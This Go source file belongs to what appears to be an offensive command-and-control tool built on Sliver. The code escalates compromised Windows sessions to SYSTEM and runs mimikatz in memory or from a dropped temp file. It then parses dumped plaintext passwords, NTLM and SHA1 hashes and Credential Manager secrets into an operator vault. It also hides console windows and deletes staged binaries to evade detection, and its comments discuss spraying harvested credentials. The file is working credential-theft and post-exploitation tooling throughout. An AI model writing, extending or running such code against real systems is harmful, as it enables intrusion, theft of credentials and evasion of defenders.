package sliver

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/bishopfox/sliver/protobuf/clientpb"

	"c2tool/internal/embed"
)

// mimikatzTimeout bounds a credential run. The generic Execute helper caps out
// at two minutes, which is not enough for lsadump::sam or a dcsync against a
// slow domain controller; a truncated run would look like an empty result
// rather than a failure, and the operator would conclude the host had no
// credentials worth stealing.
const mimikatzTimeout = 10 * time.Minute

// DefaultMimikatzCommand is the sweep that finds the most.
const DefaultMimikatzCommand = "sekurlsa::logonpasswords"

// mimikatzTargetPath is where the binary is written on the target.
//
// The temp directory is asked for rather than assumed. %TEMP% is per-user and
// writable, and a payload dropped there sits among every other installer's
// leftovers instead of standing out. C:\Windows\Temp is the fallback because it
// is the one location that stays writable when the session has no profile
// loaded -- a service context, or a token from a user who never logged on
// interactively.
func (c *Client) mimikatzTargetPath(sessionID string) string {
	dir := c.envValue(sessionID, "TEMP")
	if dir == "" {
		dir = c.envValue(sessionID, "TMP")
	}
	if dir == "" {
		dir = `C:\Windows\Temp`
	}
	return strings.TrimRight(dir, `\/`) + `\` + embed.MimikatzName
}

// envValue reads one environment variable from the target. A failure is not an
// error here: the caller has a fallback, and a session that cannot report its
// environment still deserves a harvest attempt.
func (c *Client) envValue(sessionID, name string) string {
	vars, err := c.GetEnv(sessionID)
	if err != nil {
		return ""
	}
	for _, v := range vars {
		if strings.EqualFold(v.Key, name) {
			return strings.TrimSpace(v.Value)
		}
	}
	return ""
}

// ParsedCredential is one secret recovered from a tool's console output.
type ParsedCredential struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Secret   string `json:"secret"`
	Kind     string `json:"kind"`   // "plaintext" | "ntlm" | "sha1"
	Source   string `json:"source"` // the command that produced it
}

// MimikatzRequest describes one credential-harvesting run.
type MimikatzRequest struct {
	Command string `json:"command"`
	Upload  []byte `json:"-"`
	AutoAdd bool   `json:"autoAdd"`
	// Elevate escalates to SYSTEM before running when the session's token is
	// not already elevated. Pointer so the zero value means "the caller did not
	// say", which the handler resolves to on -- the modules that need it are the
	// ones an operator reaches for, and failing with an access-denied they have
	// to interpret is worse than one extra step that reports what it did.
	Elevate *bool `json:"elevate"`
	// HostingProcess is the SYSTEM process the escalation injects into. Empty
	// lets sliver choose from its built-in list.
	HostingProcess string `json:"hostingProcess"`
	// Mode selects how the payload reaches the target: auto, memory or upload.
	// Empty means auto, which is what a client that predates this field sends.
	Mode string `json:"mode"`
	// Process is the sacrificial process a memory-mode run is injected into.
	// Empty uses the console's default. It is a path, not a pid: Sliver's
	// sideload starts this process rather than injecting into a running one.
	Process string `json:"process"`
}

// MimikatzResult is the JSON shape returned to the console.
type MimikatzResult struct {
	OK       bool               `json:"ok"`
	Command  string             `json:"command"`
	Raw      string             `json:"raw"`
	ExitCode uint32             `json:"exitCode"`
	Parsed   []ParsedCredential `json:"parsed"`
	Added    int                `json:"added"`
	Message  string             `json:"message"`
	// Elevated reports that the run was escalated to a SYSTEM session first.
	Elevated bool `json:"elevated"`
	// SessionID is the session the command actually ran on. It differs from the
	// requested one when escalation produced a new SYSTEM session.
	SessionID string `json:"sessionId"`
	// Integrity is the token integrity observed before the run, when it could be
	// read. "Medium" is the answer that explains an LSA access-denied.
	Integrity string `json:"integrity"`
	// Mode is the route the payload actually took. It can differ from the one
	// requested: auto falls back to a disk write when the payload cannot be
	// injected, and the operator needs to see that it did.
	Mode string `json:"mode,omitempty"`
	// TargetPath is the file written on the target. Empty on an in-memory run.
	TargetPath string `json:"targetPath,omitempty"`
	// Execution describes what ran before the payload started -- which host
	// process, or why the disk path was used instead. Shown beside the
	// credentials so a run is auditable without reading the raw output.
	Execution string `json:"execution,omitempty"`
}

// providerSections are the sub-blocks sekurlsa prints. Only these are treated
// as section headers: matching any "word :" line would swallow ordinary key and
// value pairs and split a credential block in half.
var providerSections = map[string]bool{
	"msv": true, "wdigest": true, "kerberos": true, "tspkg": true,
	"ssp": true, "credman": true, "livessp": true, "cloudap": true,
	"dpapi": true, "vault": true, "scecli": true, "kdcmail": true,
}

// placeholders are the values mimikatz prints when a field exists but holds
// nothing. Storing one would put a fake password in the vault that an operator
// might later spray across the estate.
var placeholders = map[string]bool{
	"": true, "(null)": true, "<null>": true, "null": true,
	"n.a.": true, "n.a": true, "(empty)": true, "none": true, "--": true,
}

func isPlaceholder(v string) bool {
	return placeholders[strings.ToLower(strings.TrimSpace(v))]
}

func isHex(s string, n int) bool {
	if len(s) != n {
		return false
	}
	for _, r := range s {
		switch {
		case r >= '0' && r <= '9', r >= 'a' && r <= 'f', r >= 'A' && r <= 'F':
		default:
			return false
		}
	}
	return true
}

// splitKV splits "Key : Value" on the first colon. The value may itself contain
// colons (vault target names do), so only the first one separates.
func splitKV(line string) (key, val string, ok bool) {
	i := strings.Index(line, ":")
	if i < 0 {
		return "", "", false
	}
	return strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:]), true
}

type parsedSecret struct {
	kind  string
	value string
}

// ParseMimikatz extracts credentials from mimikatz console output.
//
// It is deliberately tolerant. The tool prints several different shapes
// depending on the module, the Windows build, and whether a field was present
// at all, and an operator pasting output captured elsewhere cannot be asked to
// normalise it first. Anything unrecognised is skipped rather than guessed at.
func ParseMimikatz(text, source string) []ParsedCredential {
	// vault::cred prints a different shape from the sekurlsa dump: records are
	// delimited by "TargetName" and the secret sits in a hex "Credential"
	// blob rather than a named Password/NTLM field. It is parsed separately and
	// merged at the end, so neither shape has to compromise the other.
	vault := parseVaultCreds(text, source)

	var (
		out  []ParsedCredential
		seen = map[string]bool{}

		blockUser, blockDomain string

		secUser, secDomain string
		secrets            []parsedSecret
	)

	flush := func() {
		if len(secrets) == 0 {
			return
		}
		user := secUser
		if user == "" {
			// msv and friends routinely omit "* Username" for the machine
			// account and rely on the block header above.
			user = blockUser
		}
		domain := secDomain
		if domain == "" {
			domain = blockDomain
		}
		for _, s := range secrets {
			if user == "" {
				continue
			}
			key := strings.ToLower(user) + "|" + strings.ToLower(domain) + "|" + s.value
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, ParsedCredential{
				Username: user,
				Domain:   domain,
				Secret:   s.value,
				Kind:     s.kind,
				Source:   source,
			})
		}
		secUser, secDomain, secrets = "", "", nil
	}

	for _, raw := range strings.Split(text, "\n") {
		line := strings.TrimSpace(strings.TrimRight(raw, "\r"))
		if line == "" {
			continue
		}

		// "* Key : Value" is a field inside the current section.
		if strings.HasPrefix(line, "*") {
			key, val, ok := splitKV(strings.TrimSpace(strings.TrimPrefix(line, "*")))
			if !ok || isPlaceholder(val) {
				continue
			}
			switch strings.ToLower(key) {
			case "username":
				secUser = val
			case "domain":
				secDomain = val
			case "password", "pass":
				secrets = append(secrets, parsedSecret{kind: "plaintext", value: val})
			case "ntlm":
				if isHex(val, 32) {
					secrets = append(secrets, parsedSecret{kind: "ntlm", value: val})
				}
			case "sha1":
				if isHex(val, 40) {
					secrets = append(secrets, parsedSecret{kind: "sha1", value: val})
				}
			}
			continue
		}

		key, val, ok := splitKV(line)
		if !ok {
			continue
		}

		// "msv :" opens a new provider section.
		if val == "" && providerSections[strings.ToLower(key)] {
			flush()
			continue
		}

		switch strings.ToLower(key) {
		case "authentication id", "rid", "target name":
			// Each of these starts a fresh record.
			flush()
		case "user name", "username":
			// sekurlsa::logonpasswords writes "User Name" in the record header and
			// "* Username" inside a provider section. sekurlsa::msv and other
			// modules emit the unspaced "Username". All three name the same thing.
			flush()
			// Reset the block context: a stale domain from the previous record
			// would be attached to every credential in this one.
			blockUser, blockDomain = val, ""
		case "domain":
			blockDomain = val
		case "user":
			// lsadump::sam writes a bare "User :" rather than "User Name :".
			secUser = val
		case "hash ntlm":
			if isHex(val, 32) {
				secrets = append(secrets, parsedSecret{kind: "ntlm", value: val})
			}
		}
	}
	flush()

	// vault::cred shares no field names with the sekurlsa shape, so it is added
	// without going through the block scanner. Deduplicate against what the main
	// pass already produced: one pasted capture can legitimately contain both.
	for _, v := range vault {
		key := strings.ToLower(v.Username) + "|" + strings.ToLower(v.Domain) + "|" + v.Secret
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, v)
	}

	return out
}

// parseVaultCreds extracts Credential Manager entries from `vault::cred` output.
//
// The shape is one record per TargetName:
//
//	TargetName : MicrosoftAccount:user=a@b.com / <NULL>
//	UserName   : a@b.com
//	Type       : 1 - generic
//	Credential : 65 30 51 76 ...        <- hex, not text
//
// The secret is a hex-encoded byte string, so it is decoded rather than stored
// as-is: "65 30 51 76" left verbatim would put an unusable blob in the vault in
// place of the password.
func parseVaultCreds(text, source string) []ParsedCredential {
	var (
		out []ParsedCredential

		user string
		// hexSeen guards against a second UserName line in the same record
		// stealing ownership of the secret.
		hexSeen bool
	)

	emit := func(credit string, blob bool) {
		if credit == "" {
			return
		}
		// A secret with no username still matters -- an unnamed GitHub token is
		// usable. Rather than drop it, it is filed under the target it came
		// from, so it is still addressable and still dedupes.
		name := user
		if name == "" {
			name = "(vault)"
		}
		kind := "plaintext"
		if blob {
			kind = "vault-blob"
		}
		out = append(out, ParsedCredential{
			Username: name,
			Secret:   credit,
			Kind:     kind,
			Source:   source,
		})
	}

	for _, raw := range strings.Split(text, "\n") {
		line := strings.TrimSpace(strings.TrimRight(raw, "\r"))
		if line == "" {
			continue
		}

		key, val, ok := splitKV(line)
		if !ok {
			continue
		}

		switch strings.ToLower(key) {
		case "targetname":
			// A new record; the previous one is complete.
			user, hexSeen = "", false

		case "username":
			// Only meaningful before the Credential line, which is the last
			// field of a record: a later UserName belongs to the next record.
			//
			// mimikatz prints the literal "<NULL>" when the entry has no
			// associated account. Filing a live token under the username
			// "<NULL>" buries it: nobody looks up that account, and it
			// collides with every other unnamed entry in the vault.
			if !hexSeen && !isPlaceholder(val) {
				user = val
			}

		case "credential":
			hexSeen = true
			if isPlaceholder(val) {
				// "Credential :" with nothing after it is a stored entry whose
				// blob is empty -- common for persisted Microsoft accounts. The
				// username is still worth keeping as recon, with no secret.
				if user != "" {
					out = append(out, ParsedCredential{
						Username: user,
						Secret:   "",
						Kind:     "vault-reference",
						Source:   source,
					})
				}
				continue
			}
			if raw, ok := decodeHexBlob(val); ok {
				// Not every stored secret is a password. Credential Manager also
				// holds DPAPI blobs, certificate material and tokens, and those
				// decode to arbitrary bytes -- often not valid UTF-8. gRPC refuses
				// to marshal an invalid UTF-8 string and fails the WHOLE batch, so
				// a single blob would silently cost every other credential in the
				// run. Binary stays lossless by being stored hex-encoded instead.
				if utf8.Valid(raw) {
					emit(string(raw), false)
				} else {
					emit(hex.EncodeToString(raw), true)
				}
				continue
			}
			// Not a hex blob (some builds print it plainly); keep the text.
			emit(val, false)
		}
	}

	return out
}

// decodeHexBlob decodes a space-separated hex byte string such as "65 30 51 76".
// Trailing NULs are dropped, because mimikatz prints the whole fixed-size buffer
// and the padding is not part of the secret.
//
// The bytes are returned as-is rather than as a string: a vault entry can hold
// arbitrary binary, and the caller has to decide how to render it.
func decodeHexBlob(s string) ([]byte, bool) {
	fields := strings.Fields(s)
	if len(fields) == 0 {
		return nil, false
	}
	b := make([]byte, 0, len(fields))
	for _, f := range fields {
		if !isHex(f, 2) {
			return nil, false
		}
		v, err := strconv.ParseUint(f, 16, 8)
		if err != nil {
			return nil, false
		}
		b = append(b, byte(v))
	}
	b = bytes.TrimRight(b, "\x00")
	if len(b) == 0 {
		return nil, false
	}
	return b, true
}

// storeUsername folds the domain into the username.
//
// The credential vault has no domain column, so a bare "Administrator" would
// silently collide across every domain and machine on the estate. DOMAIN\user
// is the conventional rendering and keeps the two apart.
func storeUsername(domain, user string) string {
	if domain == "" || strings.Contains(user, `\`) {
		return user
	}
	return domain + `\` + user
}

func credDedupeKey(username, plaintext, hash string) string {
	secret := plaintext
	if secret == "" {
		secret = hash
	}
	return strings.ToLower(username) + "|" + secret
}

// MimikatzImport adds parsed credentials to the vault, skipping duplicates.
//
// Re-running a harvest is normal — an operator sweeps logonpasswords again after
// a fresh logon — and without the duplicate check the vault would fill with
// copies of the same finding until it was useless for review.
func (c *Client) MimikatzImport(parsed []ParsedCredential, originUUID string) (int, error) {
	if len(parsed) == 0 {
		return 0, nil
	}

	existing, err := c.Creds()
	if err != nil {
		return 0, err
	}
	seen := make(map[string]bool, len(existing))
	for _, e := range existing {
		seen[credDedupeKey(e.Username, e.Plaintext, e.Hash)] = true
	}

	var batch []CredentialView
	for _, p := range parsed {
		name := storeUsername(p.Domain, p.Username)
		if name == "" {
			continue
		}
		view := CredentialView{
			Username:       name,
			Collection:     "mimikatz",
			OriginHostUUID: originUUID,
		}
		switch p.Kind {
		case "plaintext":
			view.Plaintext = p.Secret
		case "ntlm":
			view.Hash = p.Secret
			view.HashType = int32(clientpb.HashType_NTLM)
		case "sha1":
			view.Hash = p.Secret
			view.HashType = int32(clientpb.HashType_SHA1)
		case "vault-reference":
			// A stored entry whose secret blob is empty. There is no password to
			// import, but the account name is still intelligence -- it says this
			// host holds a persisted credential for that identity, which is what
			// decides whether a later `vault::list` or a token steal is worth it.
			view.Collection = "mimikatz (reference)"
		case "vault-blob":
			// A stored secret that is not text: DPAPI material, a certificate, an
			// opaque token. It cannot be sprayed and cannot be read as a password,
			// so it is filed under its own collection and kept hex-encoded. Losing
			// it would be worse than filing it oddly: it is often the only copy of
			// a key that unlocks something else on the host.
			view.Plaintext = p.Secret
			view.Collection = "mimikatz (binary)"
		default:
			continue
		}

		// Proto strings are UTF-8 by contract. One invalid value would fail the
		// marshal for the entire batch and lose every credential in it, so the
		// offending entry is dropped here rather than taking the rest with it.
		if !utf8.ValidString(view.Username) || !utf8.ValidString(view.Plaintext) ||
			!utf8.ValidString(view.Hash) {
			continue
		}

		key := credDedupeKey(view.Username, view.Plaintext, view.Hash)
		if seen[key] {
			continue
		}
		seen[key] = true
		batch = append(batch, view)
	}

	if len(batch) == 0 {
		return 0, nil
	}
	if err := c.CredsAdd(batch); err != nil {
		return 0, err
	}
	return len(batch), nil
}

// escalationWait bounds how long a mimikatz run waits for the SYSTEM implant
// that GetSystem spawns to check in. It is generous because the new implant has
// to start, call back and register, and a slow link is not a failure.
const escalationWait = 60 * time.Second

// harvestTarget names the thing a credential run is aimed at.
//
// It exists because a beacon and a session reach the same operations by
// different routes -- the beacon's calls carry Async and BeaconID, the session's
// carry nothing special -- and the previous code only knew how to speak to a
// session. A beacon then fell through the escalation step entirely, silently.
type harvestTarget struct {
	// SessionID is set for an interactive session.
	SessionID string
	// BeaconID is set for a beacon.
	BeaconID string
}

func (t harvestTarget) isBeacon() bool { return t.BeaconID != "" && t.SessionID == "" }

// String names the target for a message. It prints the ID because an operator
// with several targets open needs to know which one a note is about.
func (t harvestTarget) String() string {
	if t.isBeacon() {
		return "beacon " + t.BeaconID
	}
	return "session " + t.SessionID
}

// SessionTarget names an interactive session.
func SessionTarget(sessionID string) harvestTarget {
	return harvestTarget{SessionID: sessionID}
}

// BeaconTarget names a beacon.
func BeaconTarget(beaconID string) harvestTarget {
	return harvestTarget{BeaconID: beaconID}
}

// ResolveTarget works out whether id names a session or a beacon, by asking the
// server which table it is in.
//
// Looked up rather than inferred from the string: Sliver does not promise the
// two ID spaces are distinguishable by shape, and guessing wrong would point a
// credential harvest at the wrong host.
func (c *Client) ResolveTarget(id string) (harvestTarget, error) {
	if id == "" {
		return harvestTarget{}, errNoIntegritySource
	}
	if sessions, err := c.Sessions(); err == nil {
		for _, s := range sessions {
			if s.ID == id {
				return harvestTarget{SessionID: id}, nil
			}
		}
	}
	if beacons, err := c.Beacons(); err == nil {
		for _, b := range beacons {
			if b.ID == id {
				return harvestTarget{BeaconID: id}, nil
			}
		}
	}
	return harvestTarget{}, fmt.Errorf("no session or beacon has id %q", id)
}

// escalateForMimikatz checks the session's token and, when it is not elevated,
// escalates to SYSTEM before the credential run.
//
// It writes what it learned into result and returns a note describing an outcome
// the operator needs to see. The return value is empty when there is nothing
// worth saying (already elevated, or the integrity could not be read and the run
// should simply proceed).
//
// The integrity read is the only reliable signal here. A medium-integrity token
// on an administrator account looks privileged in every other respect -- the
// username, the group list, `whoami /groups` -- and still cannot open LSASS,
// which is exactly the confusion this removes.
func (c *Client) escalateForMimikatz(target harvestTarget, hostingProcess string, result *MimikatzResult) string {
	level, err := c.targetIntegrity(target)
	if err != nil {
		// This used to return "" and say nothing, on the reasoning that a failure
		// here is not the run's fault. That was wrong in the way that matters:
		// the failure was guaranteed on a beacon, and staying quiet turned a
		// missing code path into a diagnosis about the operator's token. The run
		// still proceeds -- best-effort has not changed -- but it now says which
		// step was skipped and why.
		return fmt.Sprintf(
			"could not read the token integrity of %s (%v), so escalation to SYSTEM was "+
				"skipped. If the run below reports an LSA access-denied, that is why: the "+
				"payload ran on the original token. vault::cred and dpapi::cred do not need "+
				"elevation and work either way",
			target, err)
	}
	result.Integrity = level

	if IsElevatedIntegrity(level) {
		return ""
	}

	newID, err := c.targetElevateToSystem(target, hostingProcess, escalationWait)
	if err != nil {
		return fmt.Sprintf(
			"this %s's token is at %s integrity, which cannot open LSASS, and escalating to "+
				"SYSTEM failed (%v). Running anyway so the raw output is visible; the modules "+
				"that work without elevation are vault::cred and dpapi::cred",
			targetKind(target), level, err)
	}

	result.Elevated = true
	result.SessionID = newID
	return fmt.Sprintf("escalated from %s integrity to a SYSTEM session", level)
}

// targetKind names the target for a message, without the ID.
func targetKind(t harvestTarget) string {
	if t.isBeacon() {
		return "beacon"
	}
	return "session"
}

// targetIntegrity reads the token integrity of whichever target this is.
//
// The two directions are not variations on one call. GetPrivs resolves a
// SessionID through the server's session table, and a beacon is not in that
// table -- which is why asking on a beacon's behalf with a session-shaped
// request returns InvalidSessionID every time.
func (c *Client) targetIntegrity(t harvestTarget) (string, error) {
	if t.isBeacon() {
		return c.BeaconIntegrity(t.BeaconID, beaconIntegrityWait)
	}
	if t.SessionID == "" {
		return "", errNoIntegritySource
	}
	return c.SessionIntegrity(t.SessionID)
}

// targetElevateToSystem runs GetSystem against whichever target this is.
func (c *Client) targetElevateToSystem(t harvestTarget, hostingProcess string, wait time.Duration) (string, error) {
	if t.isBeacon() {
		return c.BeaconElevateToSystem(t.BeaconID, hostingProcess, wait)
	}
	if t.SessionID == "" {
		return "", errNoIntegritySource
	}
	return c.ElevateToSystem(t.SessionID, hostingProcess, wait)
}

// beaconIntegrityWait bounds the wait for a beacon to answer GetPrivs.
//
// Longer than a session's because a beacon only acts on its next check-in: at a
// sixty-second sleep interval the answer is a minute away by construction, and
// timing out before that would report "beacon did not answer" for a beacon that
// was going to.
const beaconIntegrityWait = 3 * time.Minute

// executeWithTimeout runs the mimikatz command with a caller-chosen deadline and
// a request timeout the server will honour.
//
// It delegates to execOn for the same reason every other spawn does: a Windows
// target must be started through the ExecuteWindows RPC, or the console window
// that appears on the desktop announces the run. mimikatz is the last thing an
// operator wants a window attached to.
func (c *Client) executeWithTimeout(sessionID, path string, args []string, op time.Duration) (*ExecResult, error) {
	return c.execOn(sessionID, "", path, args, op)
}

// MimikatzRun executes a credential-dumping command, parses the output, and
// optionally imports what it found.
//
// The payload reaches the target one of two ways, chosen by req.Mode: written to
// the target's temp directory and executed, or injected into a host process
// without ever touching the disk. The in-memory routes live in mimikatz_memory.go
// because that path has its own rules about when refusal is the right answer.
// MimikatzRun executes a credential-dumping command, parses the output, and
// optionally imports what it found.
//
// target is a session or a beacon. Both are accepted because the operator's
// intent is the same on either, and refusing the beacon case is what left the
// escalation step un-run for beacon operators.
func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUUID string) (*MimikatzResult, error) {
	sessionID := target.SessionID
	if target.isBeacon() {
		// A beacon has no session ID at all; the field is only used to stamp the
		// result, and stamping it with the beacon ID is what makes the run
		// traceable back to the host it came from.
		sessionID = target.BeaconID
	}
	command := strings.TrimSpace(req.Command)
	if command == "" {
		command = DefaultMimikatzCommand
	}
	mode := normalizeMimikatzMode(req.Mode)
	// An empty Upload means "use the tool this console ships". A non-empty one is
	// a payload the operator supplied, which changes which in-memory loaders can
	// apply, so the distinction is carried into the run rather than flattened.
	custom := len(req.Upload) > 0
	payload := req.Upload
	if !custom {
		payload = embed.Mimikatz
	}
	if len(payload) == 0 {
		return nil, errors.New("this build carries no mimikatz binary")
	}

	result := &MimikatzResult{Command: command, SessionID: sessionID}

	// Escalate before uploading or running anything. The check has to happen
	// first: the failure it prevents is an access-denied from inside mimikatz,
	// which the operator only sees after waiting out a ten-minute timeout, and
	// which looks like a broken tool rather than an unelevated token.
	//
	// Elevation is best-effort. If it fails -- the token has no SeDebugPrivilege
	// to inject with, or the host has no suitable SYSTEM process -- the run still
	// proceeds on the original session and the result says so. Refusing to try
	// would be worse than trying and reporting.
	var escalationNote string
	// runOn is where the payload actually goes. Escalation can move it: GetSystem
	// produces a NEW session rather than elevating the current one, so a
	// successful escalation redirects every later step there. The parameter is
	// left alone so the result still names what the operator asked for.
	runOn := target
	if req.Elevate == nil || *req.Elevate {
		escalationNote = c.escalateForMimikatz(target, req.HostingProcess, result)
		if result.Elevated {
			runOn = harvestTarget{SessionID: result.SessionID}
		}
	}
	if runOn.SessionID == "" {
		// Escalation did not move us and the target is still a beacon. The
		// execution paths need a session: Sideload, Upload and Execute all
		// resolve their target through the session table. Saying so is the point
		// of this rework -- the previous code reached the same conclusion and
		// reported it as an unelevated token.
		return nil, fmt.Errorf(
			"credential harvesting needs an interactive session, and this target is a %s "+
				"whose escalation did not produce one. Open an interactive session from it "+
				"(the console's beacon view has that action) and run the harvest there",
			targetKind(target))
	}

	// --- Execution ---------------------------------------------------------
	//
	// The in-memory route is attempted for every mode except an explicit upload.
	// Auto falls back to the disk path when the payload cannot be injected; an
	// explicit memory request is refused instead, because silently writing a
	// file answers a question the operator did not ask.
	var executionNote string
	if mode != MimikatzModeUpload {
		raw, note, err := c.runMimikatzInMemory(runOn.SessionID, command, payload, custom, req.Process)
		if err != nil {
			if mode == MimikatzModeMemory {
				return nil, err
			}
			executionNote = "内存加载不可用，已回退到上传执行（" + err.Error() + "）"
			mode = MimikatzModeUpload
		} else {
			result.Mode = MimikatzModeMemory
			result.Execution = note
			result.Raw = raw
			result.Parsed = ParseMimikatz(result.Raw, command)
		}
	}

	if mode == MimikatzModeUpload {
		// Stage after escalating, not before: the temp directory is per-session,
		// so a run that escalates to SYSTEM must write into SYSTEM's temp rather
		// than the original user's. Writing first would leave the binary in a
		// directory the elevated process may not be able to read, which surfaces
		// as a launch failure that looks like a broken payload.
		path := c.mimikatzTargetPath(runOn.SessionID)
		if err := c.Upload(runOn.SessionID, path, payload); err != nil {
			return nil, fmt.Errorf("upload %s: %w", path, err)
		}
		// "exit" keeps the tool from dropping into its interactive prompt, which
		// would hold the pipe open until the timeout instead of returning output.
		out, err := c.executeWithTimeout(runOn.SessionID, path, []string{command, "exit"}, mimikatzTimeout)
		if err != nil {
			return nil, err
		}
		result.Mode = MimikatzModeUpload
		result.TargetPath = path
		result.ExitCode = out.Status
		result.Raw = strings.TrimSpace(out.Stdout + "\n" + out.Stderr)
		result.Parsed = ParseMimikatz(result.Raw, command)

		// The binary is removed once it has run. A temp directory is not a hiding
		// place: leaving it there means the next person to list %TEMP% finds the
		// tool that was used against the host.
		if note := c.cleanupStagedFile(runOn.SessionID, path); note != "" {
			executionNote = note
		}
	}

	if executionNote != "" {
		result.Execution = strings.TrimSpace(result.Execution + " " + executionNote)
	}

	if req.AutoAdd {
		added, err := c.MimikatzImport(result.Parsed, originUUID)
		if err != nil {
			// The harvest itself succeeded, so report the credentials and the
			// import failure together rather than discarding usable output.
			result.OK = true
			result.Added = 0
			result.Message = fmt.Sprintf("parsed %d credential(s) but could not add them to the vault: %v",
				len(result.Parsed), err)
			return result, nil
		}
		result.Added = added
	}
	result.OK = true
	switch {
	case len(result.Parsed) == 0:
		result.Message = diagnoseMimikatzFailure(result.Raw, command)
	case req.AutoAdd:
		result.Message = fmt.Sprintf("parsed %d credential(s), %d new to the vault", len(result.Parsed), result.Added)
	default:
		result.Message = fmt.Sprintf("parsed %d credential(s)", len(result.Parsed))
	}

	// Say what the escalation did. A run that silently produced a second session
	// leaves the operator with two entries in the list and no explanation, and a
	// run that could not escalate has to explain why the output is an
	// access-denied.
	if escalationNote != "" {
		result.Message = escalationNote + "; " + result.Message
	}
	return result, nil
}

// diagnoseMimikatzFailure turns mimikatz's terse error codes into the reason and
// the module that would work instead.
//
// "no credentials were parsed" is the least useful thing to tell an operator:
// the same message covers "the tool ran fine and this host has no secrets" and
// "the token is not elevated, so the module could not open LSA at all". Those
// call for opposite next steps, and the raw output already says which one it is.
func diagnoseMimikatzFailure(raw, command string) string {
	low := strings.ToLower(raw)

	switch {
	case strings.Contains(low, "kuhl_m_sekurlsa_acquirelsa") || strings.Contains(low, "0x00000005"):
		return "no credentials parsed: LSA access was denied. sekurlsa reads live logon sessions " +
			"and needs an elevated token; this session's token is not elevated. vault::cred and " +
			"dpapi::cred run as the current user and work without it."

	case strings.Contains(low, "rtladjustprivilege") || strings.Contains(low, "c0000061"):
		return "no credentials parsed: privilege::debug failed with STATUS_PRIVILEGE_NOT_HELD " +
			"(0xc0000061). The token lacks SeDebugPrivilege, so the sekurlsa and lsadump modules " +
			"cannot run. vault::cred does not need it."

	case strings.Contains(low, "kuhl_m_lsadump_sam"):
		return "no credentials parsed: the SAM hive could not be read. lsadump::sam needs " +
			"administrator rights; without them the hive is unreadable."

	case strings.Contains(low, "credential guard"):
		return "no credentials parsed: Credential Guard is running on this host. Even with " +
			"administrator rights, sekurlsa cannot read the isolated LSA secrets here."

	case strings.Contains(low, "is not recognized") || strings.Contains(low, "unknown command") ||
		strings.Contains(low, "unknown module") || strings.Contains(low, "command not found"):
		return fmt.Sprintf("no credentials parsed: mimikatz did not recognise %q. Check the module "+
			"name and the build.", command)

	case strings.Contains(low, "the system cannot find the file") || strings.Contains(low, "no such file"):
		return "no credentials parsed: the mimikatz binary is not at the configured path on the target."

	case strings.Contains(low, "bye!"):
		return "mimikatz ran, but this command produced no credentials. The host may genuinely hold " +
			"none for this module; try another, or read the raw output below."

	case raw == "":
		return "the command returned no output at all. The binary may have been blocked by AV " +
			"before it could print, or the path is wrong."
	}

	return "command completed but no credentials were parsed; the output format was not " +
		"recognised. Check the raw output below."
}
